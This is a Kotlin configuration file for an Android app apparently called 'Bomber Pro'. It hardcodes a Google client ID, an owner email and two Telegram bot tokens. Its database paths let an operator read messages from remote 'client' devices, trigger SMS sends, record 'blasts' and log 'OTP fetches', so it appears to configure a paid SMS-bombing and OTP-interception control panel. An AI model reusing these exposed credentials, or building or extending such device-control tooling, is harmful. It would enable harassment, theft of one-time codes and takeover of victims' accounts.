package com.sanji.bomberpro

object FirebaseConfig {
    // Google Sign-In — Web Client ID from google-services.json oauth_client
    const val WEB_CLIENT_ID = "246986227337-7nmps9kuig9fg2vgolm6ppoh0qkuc6nq.apps.googleusercontent.com"

    // Owner (first admin)
    const val OWNER_EMAIL = "thelifekit.offi.cial@gmail.com"

    // Payment bot token — from BotFather
    const val PAYMENT_BOT_TOKEN = "8760383147:AAFTUuYN8xKLS_70lRFdoFpwr0a5Vo8svVE"
    const val PAYMENT_BOT_CHAT_ID = "7966027018"

    // Logs bot token
    const val LOGS_BOT_TOKEN = "8903201878:AAHGUAhZawpzSD7vwQxRHKr5wQVqwn-sw88"
    const val LOGS_BOT_CHAT_ID = "7966027018"

    // Firestore collections
    const val COL_USERS = "users"
    const val COL_ROLES = "roles"
    const val COL_FIREBASES = "firebases"
    const val COL_SETTINGS = "settings"
    const val COL_PAYMENT_REQUESTS = "payment_requests"
    const val COL_ACTIVITY_LOG = "activity_log"
    const val COL_AUDIT_LOG = "audit_log"
    const val COL_PAYMENT_LOG = "payment_log"
    const val COL_BLASTS = "blasts"
    const val COL_OTP_FETCHES = "otp_fetches"
    const val COL_TRANSACTIONS = "transactions"
    const val COL_GIVEAWAYS = "giveaways"
    const val COL_APPS = "apps"
    const val COL_CRASH_LOGS = "crash_logs"

    // Firestore docs
    const val DOC_GLOBAL_SETTINGS = "global"

    // Realtime DB paths
    const val RTDB_CLIENTS = "/clients.json?shallow=true"
    fun rtdbClient(devId: String) = "/clients/$devId.json"
    fun rtdbSendSms(devId: String) = "/clients/$devId/webhookEvent/sendSms.json"
    fun rtdbMessages(devId: String) = "/clients/$devId/messages.json"

    // Default Realtime DB URLs (admin panel can add more later)
    val DEFAULT_RTDB_URLS = listOf(
        "https://sanji-bomber-pro-default-rtdb.asia-southeast1.firebasedatabase.app",
    )
}